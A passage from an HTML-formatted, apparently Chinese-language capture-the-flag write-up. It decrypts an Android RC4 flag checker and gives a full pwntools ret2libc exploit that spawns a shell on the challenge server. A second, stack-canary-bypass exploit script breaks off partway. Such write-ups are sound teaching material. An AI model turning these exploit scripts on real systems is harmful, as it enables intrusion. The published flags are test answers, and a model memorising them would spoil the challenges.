style=&#34;color:#ae81ff&#34;&gt;0x4c4b4a49&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x504f4e4d&lt;/span&gt;};
    decrypt(v, k);
    decrypt(v &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, k);
    decrypt(v &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, k);
    decrypt(v &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, k);
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;, v);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;reflag-checker&#34;&gt;[RE]Flag Checker&lt;/h3&gt;
&lt;p&gt;jeb 打开&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;package&lt;/span&gt; com.example.flagchecker&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; android.os.Bundle&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; android.support.v7.app.AppCompatActivity&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; android.util.Base64&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; android.view.View.OnClickListener&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; android.view.View&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; android.widget.Button&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; android.widget.EditText&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; android.widget.Toast&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; javax.crypto.Cipher&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; javax.crypto.spec.SecretKeySpec&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;MainActivity&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extends&lt;/span&gt; AppCompatActivity &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;encrypt&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;String arg4&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; String arg5&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;throws&lt;/span&gt; Exception &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        SecretKeySpec v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; SecretKeySpec&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;arg5&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getBytes&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(),&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; arg5&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(),&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;RC4&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        Cipher v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Cipher&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getInstance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;RC4&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        v5&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;init&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; v0&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; v5&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;doFinal&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;arg4&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getBytes&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;());&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color:#a6e22e&#34;&gt;@Override&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// android.support.v7.app.AppCompatActivity
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;protected&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;onCreate&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Bundle arg2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;super&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;onCreate&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;arg2&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;setContentView&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7F09001C&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// layout:activity_main
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Button&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;findViewById&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7F070022&lt;span style=&#34;color:#f92672&#34;&gt;)).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;setOnClickListener&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; View&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;OnClickListener&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// id:button
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;@Override&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// android.view.View$OnClickListener
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;onClick&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;View arg4&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
                String v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;EditText&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;MainActivity&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;findViewById&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7F070036&lt;span style=&#34;color:#f92672&#34;&gt;)).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getText&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// id:editTextTextPersonName
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;];&lt;/span&gt;
                &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
                    v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MainActivity&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;encrypt&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;v4&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;carol&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
                &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
                &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Exception v4_1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
                    v4_1&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;printStackTrace&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
                &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;encodeToString&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;v2&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;equals&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s=&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
                    Toast&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;makeText&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MainActivity&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Congratulations!!!&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 1&lt;span style=&#34;color:#f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;show&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
                    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
                &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

                Toast&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;makeText&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MainActivity&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Fail,try again.&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 1&lt;span style=&#34;color:#f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;show&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
            &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;});&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;RC4 + Base64&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; base64 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Cipher &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; ARC4

cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; b64decode(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s=&amp;#39;&lt;/span&gt;)

key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;carol&amp;#39;&lt;/span&gt;
rc4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ARC4&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(key)

rc4&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decrypt(cipher)
&lt;span style=&#34;color:#75715e&#34;&gt;# b&amp;#39;hgame{weLC0ME_To-tHE_WORLD_oF-AnDr0|D}&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;re猫头鹰是不是猫&#34;&gt;[RE]猫头鹰是不是猫&lt;/h3&gt;
&lt;p&gt;做了两次矩阵乘法，求解方法是先把两个常数矩阵乘起来，然后用 z3 求解&lt;/p&gt;
&lt;h3 id=&#34;pwnenter_the_pwn_land&#34;&gt;[Pwn]enter_the_pwn_land&lt;/h3&gt;
&lt;p&gt;经典 ret2libc&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

context(os&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;, arch&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;, log_level&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;)

p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chuj.top&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;34671&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# p = process(b&amp;#39;./a.out&amp;#39;)&lt;/span&gt;

pop_rdi_ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x401313&lt;/span&gt;
pop_rsi_r15_ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x401311&lt;/span&gt;
puts_got &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x404020&lt;/span&gt;
puts_plt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x401090&lt;/span&gt;
test_thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4011B6&lt;/span&gt;
main &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x401260&lt;/span&gt;
ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x40101a&lt;/span&gt;

pre_payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x30&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x2c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pre_payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(pop_rdi_ret) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(puts_got) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(puts_plt) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(main)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()
puts_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; u64(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
print (hex(puts_addr))

puts_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x875A0&lt;/span&gt;
binsh_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1B75AA&lt;/span&gt;
system_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x55410&lt;/span&gt;

libc_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; puts_addr &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; puts_offset
binsh_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc_addr &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; binsh_offset
system_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc_addr &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; system_offset

payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pre_payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(ret) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(pop_rdi_ret) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(binsh_addr) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(system_addr)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;pwnenter_the_evil_pwn_land&#34;&gt;[Pwn]enter_the_evil_pwn_land&lt;/h3&gt;
&lt;p&gt;这道题目的难点在于 Canary 的绕过，用到了一个 ptrace 的特性，Canary 存储在 TLS 中，ptrace 时 TLS 距离栈较近，所以只需要疯狂往后覆盖就行，我这里覆盖了 0x900 位&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

context(os&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;, arch&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;, log_level&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;)

p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chuj.top&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;35131&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# p = process(&amp;#39;./a.out&amp;#39;)&lt;/span&gt;

pop_rdi_ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x401363&lt;/span&gt;
pop_rsi_r15_ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x401361&lt;/span&gt;
puts_got &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x404020&lt;/span&gt;
